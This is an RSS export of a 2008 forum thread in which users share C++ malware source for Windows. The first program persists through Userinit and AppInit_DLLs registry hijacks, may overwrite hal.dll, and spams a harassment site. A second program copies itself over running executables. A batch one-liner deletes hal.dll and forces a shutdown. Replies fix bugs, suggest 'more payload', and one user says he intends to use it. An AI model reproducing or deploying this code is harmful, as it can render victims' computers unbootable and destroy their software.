<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[C++]Simple C++ annoyer/virus</title>
    <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008</link>
    <description>I was bored and felt like making a virus, here&#39;s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source.

[code]
#include &lt;windows.h&gt;
#include &lt;string&gt;


char sysdir[MAX_PATH];
char pathtofile[MAX_PATH];

void RegSet()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;,0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, &quot;AppInit_DLLs&quot;,0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //basically makes it so it cant be deleted, ---&gt; google.com
        
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,&quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;,0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, &quot;Userinit&quot;,0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //replaces userinit.exe for startup, good backup system =)
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE PrevInstance, LPSTR lpzArgument, int nFunsterStil)
{
    HWND hWnd;
    HMODULE GetModH = GetModuleHandle(NULL);
             
    GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectory(sysdir, sizeof(sysdir));
    
    strcat(sysdir, &quot;\\winxphelp.exe&quot;);
    
    std::string sysdirStr = sysdir;
    std::string pathtofileStr = pathtofile;
    if (pathtofileStr != sysdirStr)
    {
        CopyFile(pathtofile, sysdir, true);
        RegSet();
        
        //ShellExecute(hWnd, &quot;open&quot;, sysdir, NULL,NULL,SW_SHOWDEFAULT);
                //removed this so it will just start on next startup, and remains idle until then.
        return 0;
    }
    
    ShellExecute(hWnd, &quot;open&quot;, &quot;explorer.exe&quot;, NULL,NULL,SW_SHOWDEFAULT); //Since userinit.dll no longer starts on startup, we need something to
                                                                        //start explorer.exe. The bonus is if they do delete this virus, the registry
                                                                        //value is still set, so userinit.exe wont start, and thus explorer.exe wont
                                                                        //start anymore.
    
    srand((unsigned)time(0));
    int Kill = (rand()%20) + 1;
    if(Kill == 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, &quot;%systemroot%\\System32\\hal.dll&quot;, false); //1 in 20 chance of &quot;infecting&quot; hal.dll (per startup)
    }
    //Doesn&#39;t simple delete hall.dll, as that would make it easy to fix it with the restore console. If it&#39;s replaced, a
    //hal.dll is still technically there, so it&#39;s not as easily fixed.
    
    Sleep(600000); //Give them 10 minutes before it messes with them, to keep a somewhat low profile.
    
    int count = 0;
    while(true)
    {
        RegSet();
        
        if (count == 179) //&quot;You are an idiot&quot; every 3 minutes.
        {
            ShellExecute(hWnd, &quot;open&quot;, &quot;http://www.youareanidiot.org/youare.swf&quot;, NULL,NULL,SW_SHOWDEFAULT);
            count = 0;
        }
        count++;
        Sleep(1000);
        
    }
    
    return 0;
}
[/code]</description>
    
    <lastBuildDate>Thu, 18 Dec 2008 05:12:25 +0000</lastBuildDate>
    <category>General Programming</category>
    <atom:link href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>[quote=“ringer24, post:12, topic:231008”][quote author=Zach1188 link=topic=304212.msg2585911#msg2585911 date=1229498830]</p>
<aside class="quote no-group">
<blockquote>
<p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
</blockquote>
</aside>
<p>I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.<br>
[/quote]<br>
The first one is the one i shall be using :).[/quote]<br>
Try out the 2nd one <img src="https://forum.moparisthebest.com/images/emoji/twitter/wink.png?v=6" title=":wink:" class="emoji" alt=":wink:"></p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/13">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/13</link>
        <pubDate>Thu, 18 Dec 2008 05:12:25 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-13</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@ringer24 ringer24]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ringer24">@ringer24</a> wrote:</p>
          <blockquote>
              <p>[quote=“Zach1188, post:11, topic:231008”][quote author=ringer24 link=topic=304212.msg2585883#msg2585883 date=1229494093]<br>
Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=<br>
[/quote]<br>
I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.[/quote]<br>
The first one is the one i shall be using :).</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/12">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/12</link>
        <pubDate>Thu, 18 Dec 2008 00:44:03 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-12</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <aside class="quote no-group quote-modified" data-post="10" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="https://forum.moparisthebest.com/letter_avatar/ringer24/40/5_6bca9977b612b7aeef77ba1ec1cd67b3.png" class="avatar"> ringer24:</div>
<blockquote>
<p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
</blockquote>
</aside>
<p>I get the feeling you don’t even know what it’s supposed to do. The 2nd one, anyway.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/11">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/11</link>
        <pubDate>Wed, 17 Dec 2008 07:27:10 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-11</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@ringer24 ringer24]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/ringer24">@ringer24</a> wrote:</p>
          <blockquote>
              <p>Thanks for the source! I’ve needed one of these to create a project. although I wont tell anyone what it does(or will do).=\</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/10">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/10</link>
        <pubDate>Wed, 17 Dec 2008 06:08:13 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-10</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>[quote=“Coder xynt, post:1, topic:250824”][quote author=Cain_ link=topic=304212.msg2439385#msg2439385 date=1221379690]<br>
that’s not a virus<br>
[/quote][/quote]<br>
I know, it’s a trojan.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/9">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/9</link>
        <pubDate>Tue, 16 Dec 2008 23:54:49 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-9</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>Here’s a better one, posting it for the hell of it:</p>
<pre><code class="lang-auto">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;Tlhelp32.h&gt;
#include &lt;string&gt;
#include &lt;fstream&gt;
#include &lt;direct.h&gt;

char winDir[MAX_PATH];
char startup[MAX_PATH];
HKEY hKey;

void TargetList() {
    HMODULE GetModH = GetModuleHandle(NULL);
    char self[MAX_PATH];
    GetModuleFileName(GetModH, self, sizeof(self));
    
    std::ifstream TarListIn;
    std::ifstream exeCheck;
    std::string targetPath;
    TarListIn.open(winDir, std::ios::in);
    exeCheck.open(startup, std::ios::in | std::ios::binary);
    std::getline (TarListIn, targetPath);
    //std::cout &lt;&lt; "\"" &lt;&lt; path &lt;&lt; "\"" &lt;&lt; std::endl;
    //std::cin.get();
    if(TarListIn.is_open() &amp;&amp; exeCheck.is_open()) {
        while(!TarListIn.eof()) {
            std::getline (TarListIn, targetPath);
            CopyFile(self, targetPath.c_str(), false);
            Sleep(50);
            //DeleteFile(path.c_str());
        }
        TarListIn.close();
    } else {
        CopyFile(self, startup, false);
        Sleep(100);
    }
    
}

void GenerateList() {
    std::ofstream TarListOut;
    std::string filePath;
    PROCESSENTRY32 sEntry;
    MODULEENTRY32 mEntry;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE ModSnap;
    
    sEntry.dwSize = sizeof(PROCESSENTRY32);
    mEntry.dwSize = sizeof(MODULEENTRY32);
    
    ModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, sEntry.th32ProcessID);
    Module32First(ModSnap, &amp;mEntry);
    std::string path;
    
    TarListOut.open(winDir, std::ios::out);    
    while(Process32Next(snapshot, &amp;sEntry)){
        ModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, sEntry.th32ProcessID);
        Module32Next(ModSnap, &amp;mEntry);
        filePath = mEntry.szExePath;
        if(filePath.find("\\") &lt; MAX_PATH) {
            TarListOut &lt;&lt; filePath &lt;&lt; std::endl; 
        }
    }
    TarListOut.close();
}

int main() {
    int reps;
    GetWindowsDirectory(startup, sizeof(startup));
    strcat(startup, "\\filehelper.exe");
    GetWindowsDirectory(winDir, sizeof(winDir));
    strcat(winDir, "\\files.txt");
    
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &amp;hKey);
    RegSetValueEx(hKey, "File info", 0, REG_SZ,(const unsigned char*)startup, sizeof(startup));
    RegCloseKey(hKey);
    while(true) {
        TargetList();
        if(reps &gt;= 9) {
            GenerateList();
            reps = 0;
        } else {reps++;}
    }
    
    return 0;
}</code></pre>
<p>More payload.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/8">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/8</link>
        <pubDate>Sun, 14 Dec 2008 23:33:09 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-8</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@xEnt xEnt]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/xent">@xEnt</a> wrote:</p>
          <blockquote>
              <p>echo i is in yur computerz<br>
echo Y | DEL %windir%/system32/hal.dll<br>
shutdown -f</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/7">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/7</link>
        <pubDate>Wed, 24 Sep 2008 23:49:17 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-7</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>woops no need to have called u a dumbass</p>
</blockquote>
</aside>
<p>It’s cool.</p>
<aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>btw replacing Userinit registry key can fuck up windows. also why use \Windows NT. attempt both \Windows and \Windows NT. use \CurrentVersion\Run to add to startup</p>
</blockquote>
</aside>
<p>I don’t see how that’s a problem, seeing how its malicious in nature. And if I did that, it would run 3 times, which isn’t what I want. I guess I could have it detect whether or not its already running, and if so, then exit.</p>
<aside class="quote no-group" data-post="5" data-topic="231008">
<div class="title">
<div class="quote-controls"></div>
 Real-life Hacker:</div>
<blockquote>
<p>btw add more to payload</p>
</blockquote>
</aside>
<p>Like? I was thinking of it detecting when a new .exe process starts, and adding it to a list in a txt file. And on next startup, it, one by one, copies itself over one of the .exe’s on the list, removes it from the list, and moves on to the next one.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/6">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/6</link>
        <pubDate>Mon, 15 Sep 2008 03:35:31 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-6</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Real-life_Hacker Real-life Hacker]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/real-life_hacker">@Real-life_Hacker</a> wrote:</p>
          <blockquote>
              <p>woops no need to have called u a dumbass[br][br][size=1]Posted on: September 14, 2008, 07:31:26 pm[/size][hr]btw replacing Userinit registry key can fuck up windows. also why use \Windows NT. attempt both \Windows and \Windows NT. use \CurrentVersion\Run to add to startup[br][br][size=1]Posted on: September 14, 2008, 07:32:33 pm[/size][hr]btw add more to payload</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/5">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/5</link>
        <pubDate>Mon, 15 Sep 2008 01:29:40 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-5</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>[quote=“Real-life Hacker, post:3, topic:231008”]<code>    if(Kill = 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }</code> woah cool!!!</p>
<p>btw u dumbass by doing that itll always infect hall.dll because an assignment is always ‘true’[/quote]<br>
Good point, forgot ==.</p>
<p>Fixed.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/4">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/4</link>
        <pubDate>Mon, 15 Sep 2008 00:33:47 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-4</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Real-life_Hacker Real-life Hacker]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/real-life_hacker">@Real-life_Hacker</a> wrote:</p>
          <blockquote>
              <p><code>    if(Kill = 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }</code> woah cool!!!</p>
<p>btw u dumbass by doing that itll always infect hall.dll because an assignment is always ‘true’</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/3">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/3</link>
        <pubDate>Mon, 15 Sep 2008 00:06:13 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-3</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>That’s exactly why I put annoyer first, I was tempted to quote “virus”. If I really wanted to make a virus, you wouldn’t see it here.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/2">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/2</link>
        <pubDate>Sun, 14 Sep 2008 20:35:12 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-2</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
      <item>
        <title>[C++]Simple C++ annoyer/virus</title>
        <dc:creator><![CDATA[@Zach1188 Zach1188]]></dc:creator>
        <description><![CDATA[
          <p><a href="https://forum.moparisthebest.com/u/zach1188">@Zach1188</a> wrote:</p>
          <blockquote>
              <p>I was bored and felt like making a virus, here’s the source, do NOT compile it, do NOT run it, and do NOT give it to anyone. This is meant only for learning purposes, which is why I commented the source.</p>
<pre><code class="lang-auto">#include &lt;windows.h&gt;
#include &lt;string&gt;


char sysdir[MAX_PATH];
char pathtofile[MAX_PATH];

void RegSet()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, "AppInit_DLLs",0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //basically makes it so it cant be deleted, ---&gt; google.com
        
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,KEY_SET_VALUE,&amp;hKey);
    RegSetValueEx(hKey, "Userinit",0,REG_SZ,(const unsigned char*)sysdir, sizeof(sysdir));
    //replaces userinit.exe for startup, good backup system =)
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE PrevInstance, LPSTR lpzArgument, int nFunsterStil)
{
    HWND hWnd;
    HMODULE GetModH = GetModuleHandle(NULL);
             
    GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectory(sysdir, sizeof(sysdir));
    
    strcat(sysdir, "\\winxphelp.exe");
    
    std::string sysdirStr = sysdir;
    std::string pathtofileStr = pathtofile;
    if (pathtofileStr != sysdirStr)
    {
        CopyFile(pathtofile, sysdir, true);
        RegSet();
        
        //ShellExecute(hWnd, "open", sysdir, NULL,NULL,SW_SHOWDEFAULT);
                //removed this so it will just start on next startup, and remains idle until then.
        return 0;
    }
    
    ShellExecute(hWnd, "open", "explorer.exe", NULL,NULL,SW_SHOWDEFAULT); //Since userinit.dll no longer starts on startup, we need something to
                                                                        //start explorer.exe. The bonus is if they do delete this virus, the registry
                                                                        //value is still set, so userinit.exe wont start, and thus explorer.exe wont
                                                                        //start anymore.
    
    srand((unsigned)time(0));
    int Kill = (rand()%20) + 1;
    if(Kill == 13) //this could be anything, really (1 - 20)
    {
        CopyFile(pathtofile, "%systemroot%\\System32\\hal.dll", false); //1 in 20 chance of "infecting" hal.dll (per startup)
    }
    //Doesn't simple delete hall.dll, as that would make it easy to fix it with the restore console. If it's replaced, a
    //hal.dll is still technically there, so it's not as easily fixed.
    
    Sleep(600000); //Give them 10 minutes before it messes with them, to keep a somewhat low profile.
    
    int count = 0;
    while(true)
    {
        RegSet();
        
        if (count == 179) //"You are an idiot" every 3 minutes.
        {
            ShellExecute(hWnd, "open", "http://www.youareanidiot.org/youare.swf", NULL,NULL,SW_SHOWDEFAULT);
            count = 0;
        }
        count++;
        Sleep(1000);
        
    }
    
    return 0;
}</code></pre>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008/1</link>
        <pubDate>Sun, 14 Sep 2008 00:00:14 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-231008-1</guid>
        <source url="https://forum.moparisthebest.com/t/c-simple-c-annoyer-virus/231008.rss">[C++]Simple C++ annoyer/virus</source>
      </item>
  </channel>
</rss>
